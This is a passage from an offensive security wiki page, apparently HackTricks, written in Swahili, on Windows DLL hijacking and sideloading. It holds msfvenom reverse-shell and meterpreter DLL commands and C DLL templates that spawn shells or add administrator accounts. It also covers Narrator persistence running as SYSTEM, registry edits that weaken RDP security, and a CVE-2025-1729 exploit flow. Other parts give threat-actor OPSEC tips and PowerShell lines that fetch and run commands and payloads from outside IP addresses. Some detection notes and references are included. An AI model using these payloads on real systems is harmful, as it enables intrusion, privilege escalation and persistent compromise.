```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Pata meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Unda mtumiaji (x86 sikuona toleo la x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Yako mwenyewe

Katika hali nyingi, DLL unayokompile lazima **iexport kila function inayoimportiwa na victim process**. Ikiwa export inayohitajika haipo, binary haiwezi kuipata na exploit hushindwa.

<details>
<summary>Kiolezo cha C DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++ DLL mfano wa kuunda mtumiaji</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL ya C mbadala yenye kiingilio cha thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Mfano wa Kisa: Utekaji wa Narrator OneCore TTS Localization DLL (Accessibility/ATs)

Windows Narrator.exe bado huchunguza DLL ya localization inayotabirika na mahususi kwa lugha wakati wa kuanza; DLL hii inaweza kutekwa ili kutekeleza msimbo wowote na kudumisha persistence.<sup>[[7]](#references)</sup>

Mambo muhimu
- Njia inayochunguzwa (build za sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Njia ya zamani (build za zamani): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa DLL inayoweza kuandikwa na kudhibitiwa na mshambuliaji ipo kwenye njia ya OneCore, hupakiwa na `DllMain(DLL_PROCESS_ATTACH)` hutekelezwa. Hakuna exports zinazohitajika.

Ugunduzi kwa kutumia Procmon
- Chuja kwa: `Process Name is Narrator.exe` na `Operation is Load Image` au `CreateFile`.
- Anzisha Narrator na uangalie jaribio la kupakia kutoka kwenye njia iliyo hapo juu.

DLL ndogo zaidi
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Ukimya wa OPSEC
- Hijack ya kijuujuu itaonyesha/k uangazia UI. Ili usivutie umakini, wakati wa ku-attach orodhesha threads za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na uisimamishe kwa `SuspendThread`; endelea kwenye thread yako mwenyewe. Tazama PoC kwa code kamili.<sup>[[8]](#references)</sup>

Kuchochea na kudumisha kupitia usanidi wa Accessibility
- Muktadha wa mtumiaji (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa mipangilio iliyo hapo juu, kuanzisha Narrator hupakia DLL iliyowekwa. Kwenye secure desktop (skrini ya kuingia), bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.

Utekelezaji wa SYSTEM unaochochewa na RDP (kusogea pembeni)
- Ruhusu safu ya usalama ya kawaida ya RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Unganisha kwa RDP kwenye host, kisha kwenye skrini ya kuingia bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.
- Utekelezaji hukoma kipindi cha RDP kinapofungwa—inject/migrate haraka.

Leta Accessibility yako mwenyewe (BYOA)
- Unaweza kuiga ingizo la registry la Accessibility Tool (AT) iliyojengewa ndani (kwa mfano, CursorIndicator), kulihariri ili lielekeze kwenye binary/DLL yoyote, kuliingiza, kisha kuweka `configuration` kuwa jina la AT hiyo. Hii huruhusu utekelezaji wowote kupitia mfumo wa Accessibility.

Vidokezo
- Kuandika chini ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuwa ndani ya `DLL_PROCESS_ATTACH`; exports hazihitajiki.

## Uchunguzi Kifani: CVE-2025-1729 - Kuongeza Haki kwa Kutumia TPQMAssistant.exe

Kisa hiki kinaonyesha **Phantom DLL Hijacking** katika Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), inayofuatiliwa kama **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Maelezo ya Athari

- **Kipengele**: `TPQMAssistant.exe` iliyoko `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Kazi Iliyopangwa**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` huendeshwa kila siku saa 9:30 AM katika muktadha wa mtumiaji aliyeingia.
- **Ruhusa za Saraka**: Inaweza kuandikwa na `CREATOR OWNER`, hivyo kuruhusu watumiaji wa ndani kuweka faili zozote.
- **Tabia ya Utafutaji wa DLL**: Hujaribu kwanza kupakia `hostfxr.dll` kutoka kwenye saraka yake ya kufanya kazi na kurekodi "NAME NOT FOUND" ikiwa haipo, jambo linaloonyesha kuwa utafutaji wa saraka ya ndani una kipaumbele.

### Utekelezaji wa Exploit

Mshambuliaji anaweza kuweka stub hasidi ya `hostfxr.dll` kwenye saraka hiyo hiyo, akitumia DLL inayokosekana kutekeleza code katika muktadha wa mtumiaji:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Mtiririko wa Mashambulizi

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` kwenye `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri scheduled task iendeshwe saa 9:30 AM katika muktadha wa mtumiaji wa sasa.
3. Ikiwa msimamizi ameingia wakati task inaendeshwa, DLL hasidi huendeshwa katika session ya msimamizi kwa kiwango cha integrity cha kati.
4. Unganisha mbinu za kawaida za UAC bypass ili kupata upendeleo wa SYSTEM kutoka kiwango cha integrity cha kati.

## Uchunguzi wa Kisa: MSI CustomAction Dropper + DLL Side-Loading kupitia Signed Host (wsc_proxy.exe)

Watendaji wa vitisho mara nyingi huunganisha droppers za MSI na DLL side-loading ili kutekeleza payloads chini ya mchakato unaoaminika na uliotiwa sahihi.<sup>[[10]](#references)</sup>

Muhtasari wa mnyororo
- Mtumiaji anapakua MSI. CustomAction huendeshwa kimyakimya wakati wa usakinishaji wa GUI (k.m., LaunchApplication au action ya VBScript), na kujenga upya hatua inayofuata kutoka kwenye resources zilizopachikwa.
- Dropper huandika EXE halali iliyotiwa sahihi pamoja na DLL hasidi kwenye saraka moja (mfano: wsc_proxy.exe iliyotiwa sahihi na Avast + wsc.dll inayodhibitiwa na mshambuliaji).
- EXE iliyotiwa sahihi inapoanzishwa, mpangilio wa utafutaji wa DLL wa Windows hupakia kwanza wsc.dll kutoka kwenye working directory, na kutekeleza msimbo wa mshambuliaji chini ya mchakato mkuu uliotiwa sahihi (ATT&CK T1574.001).

Uchambuzi wa MSI (vitu vya kuchunguza)
- Jedwali la CustomAction:
  - Tafuta maingizo yanayoendesha executables au VBScript. Mfano wa muundo unaotia shaka: LaunchApplication inayotekeleza faili iliyopachikwa chinichini.
  - Katika Orca (Microsoft Orca.exe), kagua jedwali la CustomAction, InstallExecuteSequence na Binary.
- Payloads zilizopachikwa/zinazogawanywa ndani ya MSI CAB:
  - Toa kwa njia ya kiutawala: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Au tumia lessmsi: lessmsi x package.msi C:\out
  - Tafuta vipande vingi vidogo vinavyounganishwa na kusimbuliwa na CustomAction ya VBScript. Mtiririko wa kawaida:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading kwa kutumia wsc_proxy.exe
- Weka faili hizi mbili kwenye folda moja:
  - wsc_proxy.exe: host halali iliyosainiwa (Avast). Process hujaribu kupakia wsc.dll kwa jina kutoka kwenye directory yake.
  - wsc.dll: attacker DLL. Ikiwa hakuna exports maalum zinazohitajika, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na uelekeze exports zinazohitajika kwenye library halisi huku ukiendesha payload katika DllMain.
- Tengeneza payload ndogo ya DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Kwa mahitaji ya export, tumia framework ya proxying (kwa mfano DLLirant/Spartacus) kutengeneza forwarding DLL ambayo pia huendesha payload yako.

- Mbinu hii hutegemea utatuzi wa majina ya DLL na binary mwenyeji. Ikiwa mwenyeji hutumia absolute paths au safe loading flags (kwa mfano LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), huenda hijack ikashindwa.
- KnownDLLs, SxS na forwarded exports zinaweza kuathiri mpangilio wa kipaumbele; zingatia hili unapochagua binary mwenyeji na seti ya exports.

## Triad zilizotiwa saini + payloads zilizosimbwa kwa njia fiche (uchunguzi wa ShadowPad)

Check Point ilieleza jinsi Ink Dragon inavyosambaza ShadowPad kwa kutumia **triad ya faili tatu**, ili kufanana na programu halali huku payload kuu ikiendelea kuwa imesimbwa kwa njia fiche kwenye diski:<sup>[[12]](#references)</sup>

1. **EXE mwenyeji iliyotiwa saini** – wachuuzi kama AMD, Realtek au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Washambuliaji hubadilisha jina la executable ili ionekane kama binary ya Windows (kwa mfano `conhost.exe`), lakini sahihi ya Authenticode hubaki halali.
2. **Loader DLL hasidi** – huwekwa kando ya EXE ikiwa na jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Kwa kawaida DLL hii ni binary ya MFC iliyofichwa kwa kutumia framework ya ScatterBrain; kazi yake pekee ni kutafuta blob iliyosimbwa kwa njia fiche, kuisimbua, na kufanya reflective mapping ya ShadowPad.
3. **Blob ya payload iliyosimbwa kwa njia fiche** – mara nyingi huhifadhiwa kama `<name>.tmp` kwenye saraka hiyo hiyo. Baada ya kufanya memory-mapping ya payload iliyosimbuliwa, loader hufuta faili la TMP ili kuondoa ushahidi wa forensic.

Vidokezo vya tradecraft:

* Kubadilisha jina la EXE iliyotiwa saini (huku `OriginalFileName` ya awali ikibaki kwenye kichwa cha PE) huiwezesha kujifanya binary ya Windows huku ikihifadhi sahihi ya mchuuzi. Kwa hiyo, iga tabia ya Ink Dragon ya kuweka binary zinazoonekana kama `conhost.exe` lakini ambazo kwa kweli ni zana za AMD/NVIDIA.
* Kwa kuwa executable hubaki inaaminika, vidhibiti vingi vya allowlisting vinahitaji tu DLL yako hasidi iwe kando yake. Lenga kubinafsisha loader DLL; kwa kawaida parent iliyotiwa saini inaweza kuendeshwa bila mabadiliko.
* Decryptor ya ShadowPad inatarajia blob ya TMP iwe kando ya loader na iweze kuandikwa ili iweze kufuta faili hilo baada ya mapping. Acha saraka iweze kuandikwa hadi payload ipakiwe; ikiwa tayari iko kwenye memory, faili la TMP linaweza kufutwa kwa usalama kwa OPSEC.

### Mnyororo wa LOLBAS stager + staged archive sideloading (finger → tar/curl → WMI)

Waendeshaji huunganisha DLL sideloading na LOLBAS ili artifact pekee maalum kwenye diski iwe DLL hasidi iliyo kando ya EXE inayoaminika:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** PowerShell iliyofichwa huanzisha `cmd.exe /c`, hupakua commands kutoka kwa seva ya Finger, na kuzipeleka kwenye `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` hupakua maandishi kupitia TCP/79; `| cmd` hutekeleza jibu la seva, na kuruhusu waendeshaji kubadilisha seva ya hatua ya pili upande wa seva.

- **Upakuaji/uchimbuaji uliojengewa ndani:** Pakua kumbukumbu yenye kiendelezi kisicho na madhara, ifungue, na uweke lengo la sideload pamoja na DLL chini ya folda nasibu ya `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` huficha taarifa za maendeleo na hufuata uelekezaji mwingine; `tar -xf` hutumia tar iliyojengewa ndani ya Windows.

- **Uzinduzi wa WMI/CIM:** Anzisha EXE kupitia WMI ili telemetry ionyeshe mchakato ulioundwa na CIM huku ukipakia DLL iliyo katika saraka hiyo hiyo:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Hufanya kazi na binaries zinazopendelea DLL za ndani (k.m., `intelbq.exe`, `nearby_share.exe`); payload (k.m., Remcos) huendeshwa chini ya jina linaloaminika.

- **Utafutaji:** Toa tahadhari kwa `forfiles` wakati `/p`, `/m`, na `/c` zinapoonekana pamoja; hali hii si ya kawaida nje ya admin scripts.


## Uchunguzi wa Kisa: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uvamizi wa hivi karibuni wa Lotus Blossom ulitumia vibaya mnyororo wa update unaoaminika kuwasilisha dropper iliyopakiwa kwa NSIS, ambayo iliandaa DLL sideload pamoja na payloads zinazotekelezwa kikamilifu kwenye memory.<sup>[[13]](#references)</sup>

Mtiririko wa mbinu
- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huiweka alama ya **HIDDEN**, hudondosha Bitdefender Submission Wizard `BluetoothService.exe` iliyobadilishwa jina, `log.dll` hasidi, na blob iliyosimbwa kwa njia fiche `BluetoothService`, kisha huzindua EXE.
- EXE ya host hu-import `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hupakia blob kwa mmap; `LogWrite` huifungua kwa kutumia stream maalum ya LCG (constants **0x19660D** / **0x3C6EF35F**, nyenzo muhimu zinazotokana na hash ya awali), huandika shellcode ya maandishi wazi juu ya buffer, huachilia data za muda, kisha hurukia kwake.
- Ili kuepuka IAT, loader hutatua APIs kwa kufanya hash ya majina ya export kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia avalanche ya mtindo wa Murmur (**0x85EBCA6B**) na kulinganisha matokeo na target hashes zenye chumvi.

Shellcode kuu (Chrysalis)
- Hufungua moduli kuu inayofanana na PE kwa kurudia add/XOR/sub kwa kutumia key `gQ2JR&9;` katika mizunguko mitano, kisha hupakia `Kernel32.dll` → `GetProcAddress` ili kukamilisha utatuzi wa import.
- Hujenga upya mifuatano ya majina ya DLL wakati wa runtime kupitia mabadiliko ya bit-rotate/XOR kwa kila herufi, kisha hupakia `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Hutumia resolver ya pili inayopitia **PEB → InMemoryOrderModuleList**, kuchanganua kila jedwali la export katika blocks za baiti 4 kwa kutumia uchanganyaji wa mtindo wa Murmur, na kutumia `GetProcAddress` tu ikiwa hash haipatikani.

Usanidi uliopachikwa na C2
- Config ipo ndani ya faili `BluetoothService` iliyodondoshwa kwenye **offset 0x30808** (size **0x980**) na hufunguliwa kwa RC4 kwa kutumia key `qwhvb^435h&*7`, na kufichua URL ya C2 na User-Agent.
- Beacons huunda wasifu wa host uliotenganishwa kwa nukta, huongeza tag `4Q` mwanzoni, kisha huusimba kwa RC4 kwa kutumia key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Majibu hufunguliwa kwa RC4 na kuelekezwa kwa switch ya tag (`4T` shell, `4V` utekelezaji wa process, `4W/4X` uandishi wa faili, `4Y` usomaji/exfil, `4\\` uondoaji, `4` uorodheshaji wa drive/faili + kesi za uhamishaji wa vipande).
- Hali ya utekelezaji hudhibitiwa na CLI args: bila args = kusakinisha persistence (service/Run key) inayoelekeza kwa `-i`; `-i` huanzisha upya self kwa kutumia `-k`; `-k` huruka usakinishaji na kuendesha payload.

Loader mbadala iliyoonekana
- Uvamizi huohuo ulidondosha Tiny C Compiler na kutekeleza `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, huku `libtcc.dll` ikiwa pembeni yake. C source iliyotolewa na mshambuliaji ilikuwa na shellcode iliyopachikwa, ili-compile na kuendeshwa kwenye memory bila kuweka PE kwenye diski. Iga kwa kutumia:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Hatua hii ya compile-and-run inayotumia TCC iliingiza `Wininet.dll` wakati wa runtime na kupakua shellcode ya hatua ya pili kutoka URL iliyowekwa moja kwa moja kwenye code, na hivyo kutoa loader inayoweza kubadilika na kujifanya kuwa uendeshaji wa compiler.

## Signed-host sideloading kwa export proxying + kusimamisha thread ya host

Baadhi ya minyororo ya DLL sideloading huongeza **uimarishaji wa uthabiti** ili host halali ibaki inaendeshwa kwa muda wa kutosha kupakia hatua zinazofuata bila matatizo, badala ya ku-crash baada ya malicious DLL kupakiwa.<sup>[[11]](#references)</sup>

Muundo ulioonekana
- Weka EXE inayoaminika pamoja na malicious DLL yenye jina la dependency linalotarajiwa, kama `version.dll`.
- Malicious DLL **hufanya proxy ya kila export inayotarajiwa** kwenda kwa system DLL halisi (kwa mfano `%SystemRoot%\\System32\\version.dll`) ili import resolution iendelee kufanikiwa na mchakato wa host uendelee kufanya kazi.
- Baada ya kupakiwa, malicious DLL **hupatch entry point ya host** ili main thread iingie kwenye mzunguko usioisha wa `Sleep` badala ya kutoka au kutekeleza code paths zitakazomaliza mchakato.
- Thread mpya hufanya kazi halisi hasidi: kusimbua jina au path ya DLL ya hatua inayofuata (RC4/XOR ni za kawaida), kisha kuizindua kwa `LoadLibrary`.

Kwa nini hili ni muhimu
- Kufanya proxy ya DLL kwa njia ya kawaida hudumisha ulinganifu wa API, lakini hakuhakikishi kuwa host itaendelea kuendeshwa kwa muda wa kutosha kwa hatua zinazofuata.
- Kusimamisha main thread kwenye `Sleep(INFINITE)` ni njia rahisi ya kuweka mchakato uliosainiwa ukiendelea kuendeshwa huku loader ikifanya usimbuaji, staging au kuanzisha mtandao katika worker thread.
- Kuchunguza `DllMain` inayotia shaka pekee kunaweza kukosa muundo huu ikiwa tabia muhimu hutokea baada ya entry point ya host kupatchiwa na thread ya pili kuanza.

Mtiririko wa chini kabisa wa kazi
1. Nakili EXE ya host iliyosainiwa na utambue DLL inayotatua kutoka kwenye directory ya ndani.
2. Tengeneza proxy DLL inayotoa functions zilezile na kuzipeleka kwa DLL halali.
3. Katika `DllMain(DLL_PROCESS_ATTACH)`, unda worker thread.
4. Kutoka kwenye thread hiyo, patch entry point ya host au main thread start routine ili izunguke ikitekeleza `Sleep`.
5. Simbua jina/config ya DLL ya hatua inayofuata na uite `LoadLibrary` au ufanye manual-map ya payload.

Viashiria vya ulinzi
- Michakato iliyosainiwa inayopakia `version.dll` au libraries nyingine zinazotumika sana kutoka kwenye application directory yake badala ya `System32`.
- Memory patches kwenye entry point ya mchakato muda mfupi baada ya image kupakiwa, hasa jumps/calls zinazoelekezwa kwa `Sleep`/`SleepEx`.
- Threads zilizoundwa na proxy DLL ambazo huita `LoadLibrary` mara moja kwa DLL ya pili yenye jina lililosimbuliwa.
- Full-export proxy DLL zilizowekwa karibu na vendor executables ndani ya staging directories zinazoweza kuandikika kama `ProgramData`, `%TEMP%`, au paths za archive zilizofunguliwa.

## References

- [1] [Red Canary – Maarifa ya ujasusi: Januari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Kuinua ruhusa kwa kutumia TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking katika Windows. Mfano rahisi wa C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Yapeleka Malware Mpya Inayolenga Ulaya](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks Zinapokutana na Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgangers wa Kidijitali: Muundo wa Kampeni Zinazobadilika za Kujifanya Zinazosambaza Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Maslahi Yanayokutana: Uchambuzi wa Makundi ya Vitisho Yanayolenga Serikali ya Kusini-Mashariki mwa Asia](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Jinsi Operesheni ya Kivita ya Kujificha Inavyofanya Kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Uchambuzi wa kina wa toolkit ya Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Msururu wa HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Kufuatilia Kampeni za Ujasusi za 2026 za APT ya Iran, Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Kipengele cha `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Kipengele cha `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Kipengele cha `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Kipengele cha `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Kipengele cha `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Kipengele cha `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Haraka na Kali: Operesheni za Nimbus Manticore Wakati wa Mgogoro wa Iran](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Vitendo vya Task](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Yalenga Serikali na Miundombinu Muhimu ya Kusini-Mashariki mwa Asia](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
